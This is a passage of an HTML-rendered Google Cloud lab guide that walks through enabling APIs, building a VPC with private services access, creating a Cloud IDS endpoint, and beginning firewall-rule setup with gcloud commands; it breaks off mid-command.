tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = </span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Example output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = qwiklabs-gcp-44776a13dea667a6</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> Full documentation of </span><strong><span>gcloud</span></strong><span> is available in the </span><a href='https://cloud.google.com/sdk/gcloud'><span>gcloud CLI overview guide </span></a><span>.</span></p><p><span>This lab will all be done using </span><code>gcloud</code><span> CLI commands inside Cloud Shell.</span></p><h4 id='task-1-enable-apis-2'><span>Task 1. Enable APIs</span></h4><p><span>In this task you set the project ID variable and then enable the APIs required for the lab.</span></p><ol start='' ><li><p><span>In Cloud Shell, to set the </span><strong><span>Project_ID</span></strong><span> environment variable, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">export PROJECT_ID=$(gcloud config get-value project | sed '2d')</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Enable the Service Networking API:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud services enable servicenetworking.googleapis.com \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --project=$PROJECT_ID</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><p><span>If prompted to authorize the command, click </span><strong><span>Authorize</span></strong><span>.</span></p><ol start='' ><li><p><span>Enable the Cloud IDS API:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud services enable ids.googleapis.com \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --project=$PROJECT_ID</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Enable the Cloud Logging API:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud services enable logging.googleapis.com \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --project=$PROJECT_ID</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Enable APIs.</span></p><p>&nbsp;</p><h4 id='task-2-build-the-google-cloud-networking-footprint'><span>Task 2. Build the Google Cloud networking footprint</span></h4><p><span>In this task, you create a Google Cloud VPC network and configure private services access.</span></p><p><span>Private services access is a private connection between your VPC network and a network owned by Google or a third party. Google or the third party, entities who are offering services, are also known as service producers.</span></p><p><span>The private connection enables virtual machine (VM) instances in your VPC network and the services that you access to communicate exclusively by using internal IP addresses.</span></p><ol start='' ><li><p><span>In Cloud Shell, to create a VPC, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute networks create cloud-ids \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--subnet-mode=custom</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><p><span>If prompted to authorize the command, click </span><strong><span>Authorize</span></strong><span>.</span></p><ol start='' ><li><p><span>Add a subnet to the VPC for mirrored traffic in us-east1:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute networks subnets create cloud-ids-useast1 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--range=192.168.10.0/24 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--network=cloud-ids \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--region=us-east1</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Configure private services access:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute addresses create cloud-ids-ips \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--global \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--purpose=VPC_PEERING \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--addresses=10.10.10.0 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--prefix-length=24 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--description="Cloud IDS Range" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--network=cloud-ids</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 158px;"></div><div class="CodeMirror-gutters" style="display: none; height: 158px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Create a private connection:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud services vpc-peerings connect \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--service=servicenetworking.googleapis.com \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--ranges=cloud-ids-ips \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--network=cloud-ids \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--project=$PROJECT_ID</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><p>&nbsp;</p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create a VPC.</span></p><p>&nbsp;</p><h4 id='task-3-create-a-cloud-ids-endpoint'><span>Task 3. Create a Cloud IDS endpoint</span></h4><p><span>In this task you create a Cloud IDS endpoint in us-east1 with a severity set to </span><em><span>informational</span></em><span>.</span></p><p><span>Cloud IDS uses a resource known as an IDS endpoint, a zonal resource that can inspect traffic from any zone in its region. Each IDS endpoint receives mirrored traffic and performs threat detection analysis.</span></p><p><strong><span>Note:</span></strong><span> The creation of the IDS endpoint takes approximately 20 minutes.</span></p><ol start='' ><li><p><span>To create a Cloud IDS endpoint, in Cloud Shell, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud ids endpoints create cloud-ids-east1 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--network=cloud-ids \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--zone=us-east1-b \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--severity=INFORMATIONAL \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--async</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Verify that the Cloud IDS endpoint is initiated:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud ids endpoints list --project=$PROJECT_ID</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>If the message </span><strong><span>Would you like to enable and retry</span></strong><span> appears, press </span><strong><span>Y</span></strong><span>.</span></p><p><span>The output should be similar to this:</span></p><p><span>Command Output</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  ID: cloud-ids-east1</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  LOCATION: us-east1-b</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  SEVERITY: INFORMATIONAL</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  STATE: CREATING</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  NETWORK: cloud-ids</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  TRAFFIC_LOGS:</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 135px;"></div><div class="CodeMirror-gutters" style="display: none; height: 135px;"></div></div></div></pre><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create a Cloud IDS endpoint.</span></p><p>&nbsp;</p><h4 id='task-4-create-firewall-rules-and-cloud-nat'><span>Task 4. Create Firewall rules and Cloud NAT</span></h4><p><span>In this task you create two firewall rules: allow-http-icmp and allow-iap-proxy.</span></p><p><span>To enable standard http port (TCP 80) connections, and ICMP protocol connections to the server VM from all sources in the cloud-ids network, you define the </span><em><span>allow-http-icmp</span></em><span>rule.</span></p><p><span>To enable SSH connections to the VMs from the Identity-Aware Proxy IP range, you define the allow-iap-proxy_ rule.</span></p><p><span>You also configure Cloud Router and then configure Cloud NAT. As a prerequisite for Cloud NAT, a Cloud Router must first be configured in the same region. To provide internet access to VMs that don&#39;t have a public IP address, a Cloud NAT must be created in the same region. The VMs will be created without a public IP address to make sure that they are inaccessible </span><em><span>from</span></em><span> the internet. However, they will need access </span><em><span>to</span></em><span> the internet to download updates and files.</span></p><ol start='' ><li><p><span>To create the allow-http-icmp rule, in Cloud Shell, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules create allow-http-icmp \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--direction=INGRESS \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--priority=1000 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--network=cloud-ids \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--action=ALLOW \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--rules=tcp:80,icmp \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--source-ranges=0.0.0.0/0 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 